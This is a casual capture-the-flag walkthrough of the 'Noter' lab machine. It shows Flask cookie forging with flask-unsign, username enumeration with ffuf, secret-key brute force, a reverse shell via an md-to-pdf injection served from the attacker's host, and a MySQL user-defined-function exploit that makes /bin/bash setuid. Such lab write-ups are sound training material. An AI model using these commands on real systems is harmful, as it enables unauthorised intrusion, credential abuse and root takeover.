Did some nmap scan and found 3 open ports 22, 21 & 5000 anddddd that is using 'werkzeug' & 'python'
The 5000 port is from http web page (this time there is no 80 port)


On the web page i found a register and login part. After that i tried to use the "upload note" & user/pass field to run some XSS 
or SSTI but none of that work :(. Ssssoooo its time to move on the cookie part.

Here i found that is using flask (because of the werkzeug part) so its time tu use 'flask-unsign' tool

	### flask-unsign --decode --cokie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidXNlcjIifQ.YpEexg.eSEMLVRiXr2Q_jhVCRx_9i9wzFQ' ###

Tried to change the username to 'admin' but it didn't work so i need to find a valid username. Searching a little bit more i found
that if you put a valid user on the login part it will change the "invalid credentials" part to "invalid login"

	### ffuf -w /home/user/Extra-tools/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=123" -u  http://noter.htb:5000/login ###

	so now i just need to find the secret key and change the user on the cookie part
		### python -m flask_unsign -u --cookie [your-cookie] --wordlist /rockyou.txt ###

		### flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123' --legacy ###

Inside this user there's a note with ftp credentials that conatins a file called 'policy.pdf' on this pdf there is an important part
that says:
   Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)

And if we go backtrack on the note that contains the ftp credentials we will see that the user that sends this notes is "ftp_admin"

In this user there are two zip files, the one that have a "0" (Nov file) on the name have mysql credentials but to use them first
we need a shell on the machine. To get it we have to analize the code written on those zip files, especially the "app.py"

That file have the code of the import-notes on the "blue" dashboard user on the web-page 
We can search for a exploit of the "md-to-pdf" function

On your machine:
	### python -m http.server 80 ###
On another terminal:
	### nc -lvnp 9090 ###

On the web page put the link of your machine like this:
	### http://10.10.xxxx.xxxx/shell.md ###


ROOT-PRIV-ESC:

Using the mysql credentials we are going to create an exploit with User Defined Functions:
(You can read more about this here https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf)

First we create the exploit on our machine:
Copy the code from here https://www.exploit-db.com/exploits/1518 and save it like "root-priv.c" or the name of your choice
and do the following:
	### gcc -g -c root-priv.c ### this is to compile it 
	### gcc -g -shared -Wl,-soname,root-priv.so -o root-priv.so root-priv.o -lc ### this is to create a shared library

Then we download the file from our machine to the Noter machine:
	On your machine:
		### python -m http.server ###
	On the Noter machine:
		### wget 10.10.xxxx.xxxx:8000/root-priv.so
	Now its time to access mysqldb with the credentials we see early & type this:
		### use mysql; ###
		### create table foo(line blob);###
		### insert into foo values(load_file('/home/svc/root-priv.so')); ###
		### select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/root-priv.so'; ###
		### create function do_system returns integer soname 'root-priv.so'; ###
		### select * from mysql.func; ###
		### select do_system('chmod 4777 /bin/bash'); ###
		### exit; ###
	After that the only thing to do is type the following thing:
		### bash -p ###

aaaand that's it, happy hacking :)!
